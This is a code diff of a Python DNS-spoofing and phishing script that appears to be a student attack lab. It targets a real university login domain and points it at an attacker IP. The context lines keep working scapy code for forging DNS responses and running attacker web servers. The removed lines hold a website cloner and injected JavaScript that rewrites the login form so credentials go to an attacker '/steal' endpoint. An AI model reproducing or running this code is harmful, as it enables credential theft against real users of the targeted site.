@@ -8,8 +8,7 @@ from threading import Thread
 from scapy.all import *
 from constants import ATTACKER_IP
 
-# Configuration
-attacker_ip = ATTACKER_IP
+
 target_domain = "fs.singaporetech.edu.sg"
 cloned_site_dir = "cloned_site"
 attacker_server_port = 8080
@@ -18,36 +17,6 @@ fake_answer = "PDCSRV.ICT.SIAT.EDU.SG"
 # Global variable to stop DNS spoofing
 stop_sniffing = False
 
-# Function to clone the website
-def clone_website(url, save_dir):
-    if not os.path.exists(save_dir):
-        os.makedirs(save_dir)
-
-    headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.76 Safari/537.36'}
-    response = requests.get(url, headers=headers)
-    soup = BeautifulSoup(response.text, 'html.parser')
-
-    # Save the main page
-    with open(os.path.join(save_dir, 'index.html'), 'w', encoding='utf-8') as f:
-        f.write(response.text)
-
-    # Download linked resources (CSS, JS, images)
-    for tag in soup.find_all(['link', 'script', 'img']):
-        src = tag.get('href') or tag.get('src')
-        if src:
-            src_url = urljoin(url, src)
-            # Determine file path to save
-            resource_path = os.path.join(save_dir, os.path.basename(urlparse(src_url).path))
-            # Fetch and save resource
-            try:
-                res = requests.get(src_url)
-                with open(resource_path, 'wb') as res_file:
-                    res_file.write(res.content)
-                print(f"Downloaded: {src_url}")
-            except requests.RequestException as e:
-                print(f"Failed to download {src_url}: {e}")
-
-    print("Website cloning completed.")
 
 # Function to start the web server
 def start_web_server(port, directory):
@@ -79,7 +48,7 @@ def dns_spoof(pkt):
                           IP(dst=pkt[IP].src, src=pkt[IP].dst) / \
                           UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport) / \
                           DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, \
-                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=attacker_ip))
+                              an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=ATTACKER_IP))
             sendp(spoofed_pkt, verbose=0)
             print(f"Sent spoofed DNS response to {pkt[IP].src}")
             
@@ -120,27 +89,9 @@ def start_attacker_server():
     print(f"Attacker server running on port {attacker_server_port}")
     httpd.serve_forever()
 
-# Clone the website
-clone_website(f"https://{target_domain}", cloned_site_dir)
-
-# Update the cloned index.html to include the credential stealing script
-index_path = os.path.join(cloned_site_dir, 'index.html')
-with open(index_path, 'r', encoding='utf-8') as file:
-    html_content = file.read()
-
-html_content = html_content.replace(
-    '<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" action="http://fs.singaporetech.edu.sg">',
-    f'<form method="post" id="loginForm" autocomplete="off" novalidate="novalidate" onsubmit="return sendCredentials();" action="http://{attacker_ip}:{attacker_server_port}/steal">'
-).replace(
-    '<script type="text/javascript">',
-    f'<script type="text/javascript">\nfunction sendCredentials() {{\n    var userName = document.getElementById(\'userNameInput\').value;\n    var password = document.getElementById(\'passwordInput\').value;\n\n    var xhr = new XMLHttpRequest();\n    xhr.open("POST", "http://{attacker_ip}:{attacker_server_port}/steal", true);\n    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");\n    xhr.send("username=" + encodeURIComponent(userName) + "&password=" + encodeURIComponent(password));\n\n    window.location.href = "https://xsite.singaporetech.edu.sg";\n    return false;\n}}\n'
-)
-
-with open(index_path, 'w', encoding='utf-8') as file:
-    file.write(html_content)
 
 # Start the web server in a separate thread
-web_server_thread = Thread(target=start_web_server, args=(80, "test1"))
+web_server_thread = Thread(target=start_web_server, args=(80, cloned_site_dir))
 web_server_thread.start()
 
 # Start the attacker's server in a separate thread
